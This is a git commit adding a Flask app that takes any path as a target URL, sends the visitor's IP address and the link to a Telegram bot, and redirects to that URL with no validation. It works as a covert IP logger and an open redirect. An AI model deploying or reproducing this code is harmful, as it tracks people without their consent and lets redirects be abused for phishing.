7331cef6d6623b660599b156ee516909c9d70722
khurmatillo_mamasoliev <khurmatillomamasoliev@gmail.com>
2025-08-03 22:10:58 +0500

    initial commit

---
+++ app.py
@@ -0,0 +1,32 @@
+from flask import Flask, request, redirect
+import urllib.parse
+import requests
+import os
+from dotenv import load_dotenv
+load_dotenv()
+
+app = Flask(__name__)
+
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
+
+def send_telegram_message(link, ip):
+    message = f"🔗 Link: {link}\n🌐 IP: {ip}"
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    requests.post(url, data={"chat_id": CHAT_ID, "text": message})
+
+@app.route("/<path:target_url>")
+def redirect_user(target_url):
+    if not target_url:
+        return "Missing 'url' query parameter", 400
+    decoded_url = urllib.parse.unquote(target_url)
+
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    print("here")
+    send_telegram_message(decoded_url, user_ip)
+
+    return redirect(decoded_url, code=302)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8000)
